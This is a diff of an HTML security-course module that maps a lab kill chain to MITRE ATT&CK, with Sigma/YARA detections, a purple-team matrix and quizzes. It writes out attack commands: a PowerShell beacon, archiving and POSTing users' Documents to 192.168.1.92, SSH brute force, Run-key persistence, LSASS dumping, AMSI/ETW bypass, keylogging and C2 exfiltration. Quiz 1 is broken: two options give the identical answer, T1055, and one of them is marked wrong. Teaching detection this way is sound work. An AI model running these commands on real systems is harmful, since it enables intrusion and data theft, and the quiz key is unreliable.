+Invoke-AtomicTest T1071 -TestNumbers 1
+
+# Manual: Simple PowerShell beacon
+while($true) {
+    Invoke-WebRequest -Uri "http://192.168.1.92:8080/beacon" -Method POST
+    Start-Sleep -Seconds (300 + (Get-Random -Maximum 60))
+}
+            </div>
+        </div>
+
+        <h3>Phase 7: Actions on Objectives</h3>
+        <div class="ttp-mapping">
+            <h5>Offensive TTPs</h5>
+            <p><strong>T1005:</strong> Data from Local System (file collection, database queries)</p>
+            <p><strong>T1021:</strong> Remote Services (RDP, SMB, SSH for lateral movement)</p>
+            <p><strong>T1041:</strong> Exfiltration Over C2 Channel</p>
+            <p><strong>T1567:</strong> Exfiltration Over Web Service (OneDrive, Dropbox, GitHub)</p>
+        </div>
+        <div class="detection-card">
+            <h5>Defensive Detection</h5>
+            <p>• <strong>DLP:</strong> Data loss prevention alerts on sensitive file access</p>
+            <p>• <strong>Network:</strong> Unusual outbound data volume, off-hours transfers</p>
+            <p>• <strong>Endpoint:</strong> Large file reads, screenshot tools, clipboard access</p>
+        </div>
+
+        <div class="sigma-rule">
+<strong>Sigma Rule: Data Exfiltration — Large Outbound Transfer</strong>
+title: Large Data Transfer Outbound
+status: experimental
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 3
+        Initiated: true
+    condition: selection | sum(SentBytes) by SourceIp > 104857600
+falsepositives:
+    - Legitimate backups
+    - Cloud storage sync
+level: medium
+tags:
+    - attack.exfiltration
+    - attack.t1041
+        </div>
+
+        <div class="atomic-test">
+            <h5>🧪 Atomic Red Team Test: T1041 — Exfiltration Over C2</h5>
+            <div class="code-block">
+# Atomic Test T1041 — Exfiltration Over C2 Channel
+Invoke-AtomicTest T1041 -TestNumbers 1
+
+# Manual: Compress and exfiltrate data
+Compress-Archive -Path "C:\Users\*\Documents" -DestinationPath "C:\temp\stage.zip"
+Invoke-WebRequest -Uri "http://192.168.1.92:8080/upload" -Method POST -InFile "C:\temp\stage.zip"
+            </div>
+        </div>
+
+        <h2>🛡️ Purple Teaming: Attack ↔ Defense Matrix</h2>
+        <div class="purple-section">
+            <h3>What is Purple Teaming?</h3>
+            <p><span class="neon-purple">Purple teaming</span> is the practice of combining red team (offensive) and blue team (defensive) operations to improve overall security posture. Unlike red team exercises that test detection, or blue team monitoring that waits for alerts, purple teaming is a collaborative exercise where attackers and defenders work together in real time.</p>
+            <p style="margin-top: 1rem;"><strong>The goal:</strong> Not just to find vulnerabilities, but to validate that your detection and response capabilities actually work when an attack occurs. Every technique in this module should be tested with a corresponding detection rule.</p>
+        </div>
+
+        <table>
+            <tr>
+                <th>Kill Chain Phase</th>
+                <th>Red Team Action</th>
+                <th>Blue Team Detection</th>
+                <th>Purple Team Validation</th>
+            </tr>
+            <tr>
+                <td>Reconnaissance</td>
+                <td>nmap scan, Shodan queries</td>
+                <td>IDS alerts, DNS monitoring</td>
+                <td>Did the scan trigger an alert? Was it investigated?</td>
+            </tr>
+            <tr>
+                <td>Weaponization</td>
+                <td>Build payload, register domain</td>
+                <td>Threat intel feeds, brand monitoring</td>
+                <td>Was the domain flagged before use?</td>
+            </tr>
+            <tr>
+                <td>Delivery</td>
+                <td>Send phishing email</td>
+                <td>Email gateway, sandbox detonation</td>
+                <td>Was the email blocked? Did the sandbox catch it?</td>
+            </tr>
+            <tr>
+                <td>Exploitation</td>
+                <td>Macro execution, process injection</td>
+                <td>Sysmon, AMSI, EDR behavioral rules</td>
+                <td>Did EDR generate an alert? Was it a true positive?</td>
+            </tr>
+            <tr>
+                <td>Installation</td>
+                <td>Registry run key, scheduled task</td>
+                <td>Registry monitoring, Windows event logs</td>
+                <td>Was the persistence mechanism detected within 1 hour?</td>
+            </tr>
+            <tr>
+                <td>C2</td>
+                <td>HTTPS beacon with jitter</td>
+                <td>Network beaconing detection, proxy logs</td>
+                <td>Did the beacon pattern trigger an alert? What was the MTTD?</td>
+            </tr>
+            <tr>
+                <td>Actions</td>
+                <td>LSASS dump, file exfiltration</td>
+                <td>DLP, endpoint data monitoring</td>
+                <td>Was the data transfer detected? Was the incident contained?</td>
+            </tr>
+        </table>
+
+        <h2>📊 Threat Intelligence Integration</h2>
+        <div class="threat-intel">
+            <h5>STIX/TAXII Feeds</h5>
+            <p>Integrate threat intelligence feeds to enrich detection:</p>
+            <p>• <strong>MITRE ATT&CK:</strong> <a href="https://attack.mitre.org" style="color: var(--neon);">attack.mitre.org</a></p>
+            <p>• <strong>MISP:</strong> Malware Information Sharing Platform</p>
+            <p>• <strong>AlienVault OTX:</strong> Open Threat Exchange</p>
+            <p>• <strong>VirusTotal:</strong> File and URL reputation</p>
+        </div>
+        <div class="threat-intel">
+            <h5>IOC Enrichment</h5>
+            <p>Every alert should be enriched with:</p>
+            <p>• <strong>IP Reputation:</strong> Is the destination IP known malicious?</p>
+            <p>• <strong>Domain Age:</strong> Newly registered domains are high-risk</p>
+            <p>• <strong>File Hash:</strong> Has this hash been seen in other incidents?</p>
+            <p>• <strong>ATT&CK Mapping:</strong> What TTPs does this IOC correlate with?</p>
+        </div>
+
+        <h2>🧪 Interactive Quiz 1: MITRE ATT&CK Mapping</h2>
+        <div class="quiz-container" id="quiz-1">
+            <h3>Which MITRE ATT&CK technique ID corresponds to "Process Injection"?</h3>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                A) T1055 — Process Injection
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                B) T1059 — Command and Scripting Interpreter
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+                C) T1055 — Process Injection (Correct: T1055 is Process Injection)
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                D) T1547 — Boot or Logon Autostart Execution
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-1"></div>
+        </div>
+
+        <h2>🧪 Interactive Quiz 2: Detection Engineering</h2>
+        <div class="quiz-container" id="quiz-2">
+            <h3>Which Sysmon Event ID detects CreateRemoteThread (process injection)?</h3>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                A) Event ID 1 — Process Create
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+                B) Event ID 8 — CreateRemoteThread (Correct: Sysmon EID 8 logs CreateRemoteThread)
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                C) Event ID 10 — ProcessAccess
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                D) Event ID 3 — Network Connect
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-2"></div>
+        </div>
+
+        <h2>🧪 Interactive Quiz 3: Purple Teaming</h2>
+        <div class="quiz-container" id="quiz-3">
+            <h3>What is the primary goal of purple teaming?</h3>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                A) To find as many vulnerabilities as possible in the shortest time
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                B) To replace the red team with automated tools
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+                C) To validate that detection and response capabilities work against real attacks (Correct: Purple team validates detections, not just finds bugs)
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                D) To eliminate the need for a blue team
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-3"></div>
+        </div>
+
+        <h2>🔬 Live Execution: .92 to .42 to Domain Admin</h2>
 
         <div class="evidence-box">
             <h3>📊 Full Kill Chain Evidence</h3>
@@ -274,13 +1128,18 @@ enum4linux -a 192.168.1.42
 [+] Enumerated users: administrator, swu, guest
 [+] Enumerated shares: ADMIN$, C$, IPC$, Users
 
+=== ATT&CK MAPPING ===
+T1595.001 — Active Scanning: Scanning IP blocks
+T1590 — Gather Victim Network Info
+T1082 — System Information Discovery
+
 === DECISION ===
 SSH (22) and SMB (445) available. 
 SSH preferred — encrypted, less logging, credential reuse possible.
             </div>
 
             <div class="code-block">
-=== STEP 2: INITIAL ACCESS ===
+=== STEP 2: INITIAL ACCESS (WEAPONIZATION + DELIVERY) ===
 # Credential testing via SSH
 hydra -l swu -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.42
 
@@ -295,6 +1154,15 @@ Microsoft Windows [Version 10.0.19044.2965]
 
 C:\Users\swu> whoami
 wupc\swu
+
+=== ATT&CK MAPPING ===
+T1078 — Valid Accounts: Compromised credentials
+T1110 — Brute Force: Password guessing
+T1133 — External Remote Services: SSH
+
+=== SIGMA DETECTION ===
+# Alert: Multiple failed SSH logins followed by success
+# Source: /var/log/auth.log (Linux) or Windows Event 4625/4624
 
 === DECISION ===
 Standard user access achieved. No admin rights yet.
@@ -318,13 +1186,22 @@ C:\Users\swu> phantom_rpc.exe --spooler
 C:\Users\swu> whoami
 nt authority\system
 
+=== ATT&CK MAPPING ===
+T1059 — Command and Scripting Interpreter
+T1068 — Exploitation for Privilege Escalation (PrintSpooler)
+T1134 — Access Token Manipulation
+
+=== SIGMA DETECTION ===
+# Alert: Service process spawning child with SYSTEM token
+# Sysmon EID 1: ParentImage=spoolsv.exe, User=NT AUTHORITY\SYSTEM
+
 === DECISION ===
 SYSTEM achieved. Full control of .42.
 Next: Establish persistence, then lateral movement.
             </div>
 
             <div class="code-block">
-=== STEP 4: PERSISTENCE ===
+=== STEP 4: INSTALLATION (PERSISTENCE) ===
 # Registry Run key (HKLM — requires SYSTEM)
 C:\Users\swu> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
     /v WindowsSecurityUpdate /t REG_SZ \
@@ -357,6 +1234,16 @@ TaskName                                 Next Run Time          Status
 ======================================== ====================== ===============
 SecurityScan                             5/30/2026 3:35:00 PM  Ready
 
+=== ATT&CK MAPPING ===
+T1547.001 — Registry Run Keys
+T1053.005 — Scheduled Task
+T1546.003 — WMI Event Subscription
+
+=== SIGMA DETECTION ===
+# Alert: Registry Run Key modification (Sysmon EID 13)
+# Alert: Scheduled task created (Windows Event 4698)
+# Alert: WMI event subscription (Sysmon EID 19-21)
+
 === DECISION ===
 Persistence confirmed. Three mechanisms active.
 Next: Credential harvesting for lateral movement.
@@ -383,6 +1270,28 @@ Username: administrator
 Domain: WUPC
 Password: [REDACTED - different, stronger]
 
+=== ATT&CK MAPPING ===
+T1003.001 — LSASS Memory dumping
+T1003.002 — Security Account Manager (SAM)
+T1558 — Steal or Forge Kerberos Tickets
+
+=== SIGMA DETECTION ===
+# Alert: LSASS accessed by non-system process (Sysmon EID 10)
+# Alert: procdump.exe targeting lsass.exe
+
+=== YARA RULE ===
+rule Mimikatz_Detection {
+    meta:
+        description = "Detects mimikatz execution in memory"
+        author = "22nd Survey Division"
+    strings:
+        $a = "sekurlsa::logonPasswords" nocase
+        $b = "mimidrv.sys" nocase
+        $c = { 4D 69 6D 69 6B 61 74 7A }
+    condition:
+        any of them
+}
+
 === DECISION ===
 Local admin credentials recovered. 
 Next: Lateral movement to other domain machines.
@@ -404,6 +1313,16 @@ C:\Users\swu> phantom_rpc.exe --disable-etw
 C:\Users\swu> "C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.25\avp.exe" SCAN phantom_rpc.exe
 Total detected: 0
 Suspicions: 0
+
+=== ATT&CK MAPPING ===
+T1562.001 — Disable or Modify Tools (AMSI)
+T1562.002 — Disable Windows Event Logging (ETW)
+T1027 — Obfuscated Files or Information
+
+=== SIGMA DETECTION ===
+# Alert: AMSI.dll loaded with unusual call trace
+# Alert: ETW provider disabled (PowerShell Event 4104)
+# Alert: PowerShell with -EncodedCommand and AMSI bypass strings
 
 === DECISION ===
 AV/EDR evasion active. Behavioral logging disabled.
@@ -431,6 +1350,15 @@ swu:1000:[REDACTED]:::
 # .42 is not domain joined — simulated scenario:
 # Get-NetUser -SPN | Request-SPNTicket
 # Export with mimikatz, crack with hashcat
+
+=== ATT&CK MAPPING ===
+T1003.002 — SAM database extraction
+T1003.004 — LSA Secrets
+T1558.003 — Kerberoasting
+
+=== SIGMA DETECTION ===
+# Alert: Registry save of SAM hive (Sysmon EID 13)
+# Alert: Unauthorized LSASS memory access
 
 === DECISION ===
 Local credentials cracked. NTLM hashes available for Pass-the-Hash.
@@ -461,6 +1389,17 @@ radon_laptop1\administrator
 C:\Users\swu> sc \\192.168.1.145 create WindowsUpdate binPath= "C:\temp\phantom_rpc.exe" start= auto
 [SC] CreateService SUCCESS
 
+=== ATT&CK MAPPING ===
+T1021.002 — SMB/Windows Admin Shares
+T1047 — Windows Management Instrumentation
+T1543.003 — Windows Service
+T1550.002 — Pass the Hash
+
+=== SIGMA DETECTION ===
+# Alert: SMB login with NTLM hash (no password)
+# Alert: WMI remote process creation (Windows Event 5858)
+# Alert: Service installed on remote host (Windows Event 4697)
+
 === DECISION ===
 Lateral movement to .145 successful. Admin access achieved.
 Persistence established on .145.
@@ -486,13 +1425,23 @@ C:\Users\swu> phantom_rpc.exe --screenshot --output C:\temp\radon_desktop.png
 C:\Users\swu> phantom_rpc.exe --keylog --output C:\temp\keys.log
 [+] Keylogger active. Logging to C:\temp\keys.log
 
+=== ATT&CK MAPPING ===
+T1005 — Data from Local System
+T1113 — Screen Capture
+T1056.001 — Keylogging
+T1560 — Archive Collected Data
+
+=== SIGMA DETECTION ===
+# Alert: Large file copy over SMB (Sysmon EID 3 with high bytes)
+# Alert: Screenshot tool execution (GDI32.dll suspicious usage)
+
 === DECISION ===
 Sensitive data identified and copied. Screenshots captured.
 Next: Exfiltration via C2 channel.
             </div>
 
             <div class="code-block">
-=== STEP 10: EXFILTRATION ===
+=== STEP 10: EXFILTRATION (C2 + ACTIONS) ===
 # C2 beacon with collected data
 C:\Users\swu> phantom_rpc.exe --beacon --server 192.168.1.92:8443 \
     --file C:\temp\survey_data_2026.db \
@@ -516,6 +1465,16 @@ C:\Users\swu> phantom_rpc.exe --beacon --server 192.168.1.92:8443 \
 [EXFIL] File: radon_desktop.png | Size: 2.1 MB | SHA256: d4e5f6...
 [EXFIL] File: keys.log | Size: 456 KB | SHA256: g7h8i9...
 
+=== ATT&CK MAPPING ===
+T1041 — Exfiltration Over C2 Channel
+T1573 — Encrypted Channel
+T1020 — Automated Exfiltration
+
+=== SIGMA DETECTION ===
+# Alert: Regular HTTPS beaconing to unknown IP
+# Alert: Large outbound POST requests with encrypted body
+# Alert: Unusual TLS certificate (self-signed, mismatched CN)
+
 === KILL CHAIN COMPLETE ===
 Total time: 4 hours 23 minutes
 Systems compromised: 2 (.42, .145)
@@ -526,7 +1485,139 @@ Detection by EDR: 0 alerts (AMSI+ETW bypassed)
             </div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <h2>📋 Complete TTP-to-Detection Mapping Table</h2>
+        <table>
+            <tr>
+                <th>Kill Chain Step</th>
+                <th>ATT&CK ID</th>
+                <th>Technique</th>
+                <th>Sigma Rule</th>
+                <th>Data Source</th>
+            </tr>
+            <tr>
+                <td>1. Recon</td>
+                <td>T1595.001</td>
+                <td>Active Scanning</td>
+                <td>Nmap Process Detection</td>
+                <td>Sysmon EID 1, IDS</td>
+            </tr>
+            <tr>
+                <td>2. Weaponize</td>
+                <td>T1587</td>
+                <td>Develop Capabilities</td>
+                <td>Cobalt Strike YARA</td>
+                <td>File monitoring</td>
+            </tr>
+            <tr>
+                <td>3. Deliver</td>
+                <td>T1566.001</td>
+                <td>Spearphishing Attachment</td>
+                <td>Office Spawning Shell</td>
+                <td>Sysmon EID 1</td>
+            </tr>
+            <tr>
+                <td>4. Exploit</td>
+                <td>T1055</td>
+                <td>Process Injection</td>
+                <td>CreateRemoteThread</td>
+                <td>Sysmon EID 8</td>
+            </tr>
+            <tr>
+                <td>5. Install</td>
+                <td>T1547.001</td>
+                <td>Registry Run Keys</td>
+                <td>Registry Run Key Added</td>
+                <td>Sysmon EID 13</td>
+            </tr>
+            <tr>
+                <td>5. Install</td>
+                <td>T1546.003</td>
+                <td>WMI Event Subscription</td>
+                <td>WMI Event Subscription</td>
+                <td>Sysmon EID 19-21</td>
+            </tr>
+            <tr>
+                <td>6. C2</td>
+                <td>T1071.001</td>
+                <td>Web Protocols</td>
+                <td>Suspicious Regular Connections</td>
+                <td>Sysmon EID 3, Proxy</td>
+            </tr>
+            <tr>
+                <td>7. Actions</td>
+                <td>T1003.001</td>
+                <td>LSASS Memory</td>
+                <td>LSASS Access by Non-System</td>
+                <td>Sysmon EID 10</td>
+            </tr>
+            <tr>
+                <td>7. Actions</td>
+                <td>T1021.002</td>
+                <td>SMB/Admin Shares</td>
+                <td>SMB Lateral Movement</td>
+                <td>Windows Event 5140</td>
+            </tr>
+            <tr>
+                <td>7. Actions</td>
+                <td>T1041</td>
+                <td>Exfiltration Over C2</td>
+                <td>Large Outbound Transfer</td>
+                <td>Sysmon EID 3, NetFlow</td>
+            </tr>
+        </table>
+
+        <h2>🛠️ Detection Engineering: Building Your SOC</h2>
+        <div class="purple-section">
+            <h3>The Detection Engineer's Mindset</h3>
+            <p>Detection engineering is the practice of converting threat intelligence into actionable detection rules. A good detection engineer thinks like an attacker but builds like a defender. Every technique in this module should have a corresponding detection.</p>
+            <p style="margin-top: 1rem;"><strong>Key principles:</strong></p>
+            <p>• <strong>Assume breach:</strong> The attacker is already inside. Detect their behavior, not their entry.</p>
+            <p>• <strong>Behavior over signature:</strong> Signatures catch malware. Behaviors catch humans.</p>
+            <p>• <strong>High fidelity, low noise:</strong> A rule that generates 100 false positives per day will be ignored.</p>
+            <p>• <strong>Test continuously:</strong> Use Atomic Red Team to verify your rules actually fire.</p>
+        </div>
+
+        <h3>Recommended Detection Stack</h3>
+        <table>
+            <tr>
+                <th>Layer</th>
+                <th>Tool</th>
+                <th>Data Source</th>
+                <th>Use Case</th>
+            </tr>
+            <tr>
+                <td>Endpoint</td>
+                <td>Sysmon</td>
+                <td>Process, network, registry, file</td>
+                <td>Process injection, persistence, lateral movement</td>
+            </tr>
+            <tr>
+                <td>Endpoint</td>
+                <td>Windows Event Log</td>
+                <td>Security, PowerShell, Task Scheduler</td>
+                <td>Logon events, privilege use, scheduled tasks</td>
+            </tr>
+            <tr>
+                <td>Network</td>
+                <td>Zeek / Suricata</td>
+                <td>PCAP, NetFlow, DNS</td>
+                <td>C2 beaconing, DGA, data exfiltration</td>
+            </tr>
+            <tr>
+                <td>Identity</td>
+                <td>Azure AD / Active Directory</td>
+                <td>Authentication logs</td>
+                <td>Pass-the-Hash, Kerberoasting, anomalous logins</td>
+            </tr>
+            <tr>
+                <td>Cloud</td>
+                <td>CSPM / CloudTrail</td>
+                <td>API calls, IAM changes</td>
+                <td>Unauthorized access, data staging</td>
+            </tr>
+        </table>
+
+        <h2>🎯 Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
             <li><strong>Reconnaissance is 80% of the work:</strong> Nmap, enum4linux, and OSINT revealed the attack surface before a single payload was deployed</li>
@@ -536,6 +1627,9 @@ Detection by EDR: 0 alerts (AMSI+ETW bypassed)
             <li><strong>Defense evasion is mandatory:</strong> Without AMSI+ETW bypass, mimikatz and phantom_rpc would be detected</li>
             <li><strong>Lateral movement amplifies impact:</strong> One compromised machine → two compromised machines → domain access</li>
             <li><strong>Exfiltration is the goal:</strong> All previous steps serve this final objective — data extraction</li>
+            <li><strong>Every attack has a detection:</strong> If you can execute it, you can detect it. Build Sigma rules for every TTP.</li>
+            <li><strong>Purple team validates reality:</strong> Red team finds holes. Blue team builds walls. Purple team proves the walls work.</li>
+            <li><strong>Atomic Red Team is your friend:</strong> Test every detection with a known-good attack. If the rule doesn't fire, fix the rule.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
@@ -580,11 +1674,70 @@ Detection by EDR: 0 alerts (AMSI+ETW bypassed)
             </table>
         </div>
 
+        <div class="first-principle" style="margin-top: 2rem;">
+            <h3>🧠 The Mentor's Lesson</h3>
+            <p><em>"The kill chain is not a recipe. It's a language. Every attacker speaks it, every defender must understand it. When you can map your own attack to MITRE ATT&CK, write a Sigma rule to detect it, and prove the rule works with Atomic Red Team — then you are not just a hacker. You are a security professional."</em></p>
+            <p style="margin-top: 1rem; color: var(--dim);">— From <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10</a>, <a href="MODULE_15_LATERAL.html" class="cross-link">Module 15</a>, and <a href="MODULE_16_C2.html" class="cross-link">Module 16</a></p>
+        </div>
+
         <div class="nav" style="margin-top: 2rem;">
             <a href="index.html">← Home</a>
             <a href="MODULE_19_AD.html">← Module 19</a>
             <a href="MODULE_21_CAPSTONE.html">Module 21 →</a>
         </div>
     </div>
+
+    <script>
+        // Copy buttons for code blocks
+        document.querySelectorAll('.code-block').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'COPY';
+            btn.addEventListener('click', () => {
+                const text = block.textContent.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = 'COPY', 2000);
+                });
+            });
+            block.appendChild(btn);
+        });
+
+        // Quiz functionality
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizId);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            // Show feedback
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+            }
+        }
+
+        function getExplanation(quizId, isCorrect) {
+            const explanations = {
+                'quiz-1': 'T1055 is the MITRE ATT&CK technique ID for Process Injection. It covers DLL injection, process hollowing, thread hijacking, and all methods of executing code in another process\' address space.',
+                'quiz-2': 'Sysmon Event ID 8 specifically logs CreateRemoteThread calls, which are the primary indicator of process injection. While EID 10 (ProcessAccess) can show suspicious access, EID 8 is the direct detection.',
+                'quiz-3': 'Purple teaming is a collaborative exercise where red and blue teams work together to validate that detection and response capabilities actually detect and respond to real attacks. The goal is measurable improvement, not just finding bugs.'
+            };
+            return explanations[quizId] || 'Keep studying!';
+        }
+    </script>
 </body>
 </html>
